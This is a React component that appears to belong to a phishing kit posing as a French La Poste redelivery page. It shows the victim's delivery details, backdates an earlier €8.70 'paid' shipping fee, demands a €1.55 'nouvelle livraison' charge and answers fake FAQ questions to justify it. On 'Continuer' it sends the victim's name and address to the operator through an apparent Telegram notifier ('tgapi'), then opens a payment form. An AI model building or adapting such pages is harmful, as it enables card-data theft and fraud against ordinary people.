import { useState, useEffect } from "react";
import FrPaymentForm from "./FrPaymentForm";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { User, Home, MapPin, Phone, Calendar, Clock, ThumbsUp, CreditCard, ChevronDown, ChevronUp } from "lucide-react";
import { sendPaymentAcceptedNotification } from "../tgapi";
import { subDays, format, getDay } from "date-fns";
import { fr } from "date-fns/locale";
interface FrReviewFormProps {
  deliveryDate?: string;
  deliveryTime?: string;
  name?: string;
  address?: string;
  city?: string;
  postCode?: string;
  phone?: string;
}
const FrReviewForm = ({
  deliveryDate,
  deliveryTime,
  name,
  address,
  city,
  postCode,
  phone
}: FrReviewFormProps) => {
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isShippingExpanded, setIsShippingExpanded] = useState(false);
  const [isRedeliveryExpanded, setIsRedeliveryExpanded] = useState(true);
  const [selectedFAQ, setSelectedFAQ] = useState<number | null>(null);
  const [showPaymentForm, setShowPaymentForm] = useState(false);
  
  // Calculate payment date (4 days earlier, or 5 if it falls on Sunday)
  const getPaymentDate = () => {
    const today = new Date();
    const fourDaysAgo = subDays(today, 4);
    const dayOfWeek = getDay(fourDaysAgo); // 0 = Sunday, 1 = Monday, etc.
    
    if (dayOfWeek === 0) { // Sunday
      return subDays(today, 5);
    }
    return fourDaysAgo;
  };
  
  const paymentDate = format(getPaymentDate(), "d MMM", { locale: fr });
  const handleContinueClick = async () => {
    const invoiceName = name || "Unknown Invoice";
    const fullAddress = `${address || ""}, ${city || ""}, ${postCode || ""}`.replace(/^,\s*|,\s*$/g, '');
    await sendPaymentAcceptedNotification(invoiceName, fullAddress);
    setShowPaymentForm(true);
  };

  // Auto scroll to top when payment form is shown
  useEffect(() => {
    if (showPaymentForm) {
      window.scrollTo({
        top: 0,
        behavior: 'smooth'
      });
    }
  }, [showPaymentForm]);
  useEffect(() => {
    // Immediate scroll to top when component mounts
    window.scrollTo({
      top: 0,
      behavior: 'smooth'
    });
    // Also try scrolling after a small delay to ensure DOM is ready
    setTimeout(() => {
      window.scrollTo({
        top: 0,
        behavior: 'smooth'
      });
    }, 100);
  }, []);
  if (showPaymentForm) {
    return <FrPaymentForm onComplete={() => setIsSubmitted(true)} amount="€1,55" name={name} address={address} city={city} postCode={postCode} phone={phone} />;
  }
  if (isSubmitted) {
    return <div className="space-y-6 animate-fade-in">
        <Card className="glass-card shadow-2xl border border-green-200/50">
          <CardContent className="text-center py-8">
            <div className="relative mb-6">
              <div className="w-20 h-20 mx-auto rounded-full bg-green-100 flex items-center justify-center">
                <ThumbsUp className="h-10 w-10 text-green-600" />
              </div>
            </div>
            <div className="space-y-3">
              <h2 className="text-xl font-bold text-gray-900">Merci !</h2>
              <p className="text-gray-600">Votre demande a été transmise avec succès.</p>
            </div>
          </CardContent>
        </Card>
      </div>;
  }
  const deliveryDetails = [{
    icon: User,
    label: "Destinataire",
    value: name || "",
    color: "text-yellow-600",
    bgColor: "bg-yellow-50"
  }, {
    icon: Home,
    label: "Adresse de livraison", 
    value: address || "",
    color: "text-yellow-600",
    bgColor: "bg-yellow-50"
  }, {
    icon: MapPin,
    label: "Ville/Code postal",
    value: city && postCode ? `${city}, ${postCode}` : city || postCode || "",
    color: "text-yellow-600",
    bgColor: "bg-yellow-50"
  }, {
    icon: Phone,
    label: "Numéro de contact",
    value: phone || "",
    color: "text-yellow-600",
    bgColor: "bg-yellow-50"
  }, {
    icon: Calendar,
    label: "Date choisie",
    value: deliveryDate || "",
    color: "text-yellow-600",
    bgColor: "bg-yellow-50"
  }, {
    icon: Clock,
    label: "Heure de livraison",
    value: deliveryTime || "",
    color: "text-yellow-600",
    bgColor: "bg-yellow-50"
  }].filter(item => item.value);
  return <div className="space-y-6 animate-fade-in mx-[11px] px-[11px]">
      <Card className="glass-card hover-lift shadow-2xl hover:shadow-3xl transition-all duration-300 ease-in-out border border-gray-200/50 w-full max-w-lg mx-auto hover:scale-98 hover:shadow-xl transform">
        <CardHeader className="pb-0">
        </CardHeader>
        
        <CardContent className="px-6 mx-0 py-4 my-0">
          {/* Delivery Details Header */}
          <div className="flex items-center text-sm font-semibold mb-2 -mt-4">
            <span className="relative inline-block drop-shadow-sm">
                <span className="relative z-10">Vérifier les détails de livraison</span>
              </span>
          </div>
          
          {/* Delivery Details Items */}
          <div className="space-y-2 mt-4">
            {deliveryDetails.map((item, index) => {
            const Icon = item.icon;
            const showSpacer = item.label === "Date choisie";
            return <div key={index}>
                {showSpacer && <div className="h-4"></div>}
                <div className={`group flex items-center space-x-4 ${item.label === "Heure de livraison" || item.label === "Numéro de contact" ? "mb-4" : ""} relative`} style={{
                animationDelay: `${index * 0.1}s`
              }}>
                      <div className={`relative p-2 rounded-xl ${item.bgColor} group-hover:scale-110 group-hover:rotate-3 transition-all duration-300 shadow-md shadow-black/10 group-hover:shadow-xl group-hover:shadow-black/20 border border-white/50 backdrop-blur-sm`}>
                        <Icon className={`h-4 w-4 ${item.color} drop-shadow-sm group-hover:drop-shadow-md transition-all duration-300`} />
                        <div className="absolute inset-0 rounded-xl bg-gradient-to-br from-white/20 to-transparent pointer-events-none"></div>
                      </div>
                      <div className="flex-1 min-w-0">
                        <p className="text-[11px] font-medium text-muted-foreground mb-1 relative">
                          <span className="relative inline-block">
                            <span className="relative z-10">{item.label}</span>
                            <div className="absolute top-1 left-1/4 w-1/2 h-0.5 bg-gray-400/30 rounded-full blur-sm"></div>
                            <div className="absolute top-1.5 left-1/3 w-1/3 h-1 bg-gray-300/20 rounded-full blur-md"></div>
                          </span>
                        </p>
                        <p className="text-xs font-semibold text-card-foreground group-hover:text-card-foreground/80 transition-colors duration-300 relative">
                          <span className="relative inline-block">
                            <span className="relative z-10">{item.value}</span>
                            <div className="absolute top-1 left-1/4 w-1/2 h-0.5 bg-gray-400/30 rounded-full blur-sm"></div>
                            <div className="absolute top-1.5 left-1/3 w-1/3 h-1 bg-gray-300/20 rounded-full blur-md"></div>
                          </span>
                        </p>
                      </div>
                      {(item.label === "Heure de livraison" || item.label === "Numéro de contact") && <div className="absolute -bottom-2 left-0 right-4 h-px border-b border-gray-200"></div>}
                    </div>
                  </div>;
          })}
          </div>
        </CardContent>
      </Card>

      {/* Payment Information Card */}
      <Card className="glass-card hover-lift shadow-2xl hover:shadow-3xl transition-all duration-300 ease-in-out border border-gray-200/50 w-full max-w-lg mx-auto hover:scale-98 hover:shadow-xl transform">
        <CardHeader className="pb-0">
        </CardHeader>
        
        <CardContent className="px-4 mx-0 my-[5px] py-0">
          {/* Payment Information Header */}
          <div className="flex items-center justify-between text-sm font-semibold mb-2 -mt-4">
            <div className="flex items-center">
              <div className="relative p-2 rounded-xl bg-green-50 mr-3 shadow-md border border-white/50 backdrop-blur-sm">
                <CreditCard className="h-4 w-4 text-green-600 drop-shadow-sm" />
                <div className="absolute inset-0 rounded-xl bg-gradient-to-br from-white/20 to-transparent pointer-events-none"></div>
              </div>
              <span className="relative inline-block drop-shadow-sm">
                <span className="relative z-10 text-gray-700 text-sm">Frais de nouvelle livraison</span>
              </span>
            </div>
            <div className="w-6 h-6 rounded-full bg-green-100 flex items-center justify-center">
              <div className="w-3 h-3 rounded-full bg-green-500"></div>
            </div>
          </div>
          
          {/* Payment Details Items */}
          <div className="mt-4">
            {/* Shipping - Collapsible */}
            <div className="">
              <div className="flex justify-between items-center cursor-pointer py-2" onClick={() => setIsShippingExpanded(!isShippingExpanded)}>
                <div className="flex items-center">
                  <p className="text-gray-700 font-medium text-[11px]">Expédition</p>
                  {isShippingExpanded ? <ChevronUp className="h-4 w-4 text-gray-400 ml-2" /> : <ChevronDown className="h-4 w-4 text-gray-400 ml-2" />}
                </div>
              </div>
              
              {isShippingExpanded && <div className="flex justify-between items-start pb-3 border-b border-gray-200 animate-fade-in">
                  <div>
                    <p className="text-[11px] text-gray-700">La Poste Standard</p>
                  </div>
                  <div className="text-right">
                    <p className="text-gray-700 font-semibold text-xs">€8.70</p>
                    <p className="text-[11px] text-gray-700">Payé le {paymentDate}</p>
                  </div>
                </div>}
            </div>
            
            {/* Redelivery - Collapsible */}
            <div className="border-b border-gray-200">
              <div className="flex justify-between items-center cursor-pointer py-2" onClick={() => setIsRedeliveryExpanded(!isRedeliveryExpanded)}>
                <div className="flex items-center">
                  <p className="text-gray-700 font-medium text-[11px]">Nouvelle livraison</p>
                  {isRedeliveryExpanded ? <ChevronUp className="h-4 w-4 text-gray-400 ml-2" /> : <ChevronDown className="h-4 w-4 text-gray-400 ml-2" />}
                </div>
              </div>
              
              {isRedeliveryExpanded && <div className="flex justify-between items-start pb-3 animate-fade-in">
                  <div>
                    <p className="text-[11px] text-gray-700">Nouvelle livraison standard</p>
                  </div>
                  <div className="text-right">
                    <p className="text-gray-700 font-semibold text-xs">1.55</p>
                    <p className="text-[11px] text-gray-700">Non payé</p>
                  </div>
                </div>}
            </div>
            
            {/* Total */}
            <div className="flex justify-between items-center mb-4">
              <p className="text-gray-700 font-semibold text-sm">Total</p>
              <p className="text-gray-700 font-bold text-sm">€1,55</p>
            </div>
            
            {/* Continue Button */}
            <div className="flex justify-center pb-4">
              <Button onClick={handleContinueClick} className="w-auto px-6 py-2 bg-gradient-to-r from-green-400 to-green-500 hover:from-green-500 hover:to-green-600 text-white shadow-lg hover:shadow-xl transition-all duration-300 text-sm font-semibold rounded-lg hover:scale-105 active:scale-95">
                Continuer
              </Button>
            </div>
          </div>
        </CardContent>
      </Card>
      
      {/* FAQ Links - Outside the card */}
      <div className="space-y-2 px-4 pb-4 mt-4 text-center">
        <div className="text-xs text-gray-600 underline cursor-pointer hover:text-gray-800 font-chevin font-thin" onClick={() => setSelectedFAQ(selectedFAQ === 1 ? null : 1)}>
          Pourquoi dois-je payer à nouveau ?
        </div>
        {selectedFAQ === 1 && <div className="text-xs text-gray-700 bg-gray-50 p-2 rounded ml-2 font-chevin text-center">
            Les frais de livraison initiaux couvrent la première tentative de livraison. Des frais supplémentaires s'appliquent pour programmer une nouvelle livraison.
          </div>}
        
        <div className="text-xs text-gray-600 underline cursor-pointer hover:text-gray-800 font-chevin font-thin" onClick={() => setSelectedFAQ(selectedFAQ === 2 ? null : 2)}>
          Pourquoi ne m'appelez-vous pas avant ?
        </div>
        {selectedFAQ === 2 && <div className="text-xs text-gray-700 bg-gray-50 p-2 rounded ml-2 font-chevin text-center">
            Nous avons tenté la livraison mais n'avons pas pu vous joindre. Vérifiez vos coordonnées pour les futures livraisons.
          </div>}
        
        <div className="text-xs text-gray-600 underline cursor-pointer hover:text-gray-800 font-chevin font-thin" onClick={() => setSelectedFAQ(selectedFAQ === 3 ? null : 3)}>
          Pourquoi ne pouvez-vous pas réessayer ?
        </div>
        {selectedFAQ === 3 && <div className="text-xs text-gray-700 bg-gray-50 p-2 rounded ml-2 font-chevin text-center">
            Nous avons déjà effectué les tentatives de livraison requises. Vous pouvez récupérer votre colis dans votre relais local ou programmer une nouvelle livraison.
          </div>}
        
        <div className="text-xs text-gray-600 underline cursor-pointer hover:text-gray-800 font-chevin font-thin" onClick={() => setSelectedFAQ(selectedFAQ === 4 ? null : 4)}>
          Pourquoi ne pouvez-vous pas le garder jusqu'à demain ?
        </div>
        {selectedFAQ === 4 && <div className="text-xs text-gray-700 bg-gray-50 p-2 rounded ml-2 font-chevin text-center">
            Les colis sont conservés 18 jours dans votre relais local. La nouvelle livraison vous permet de choisir un créneau qui vous convient.
          </div>}
      </div>
    </div>;
};
export default FrReviewForm;
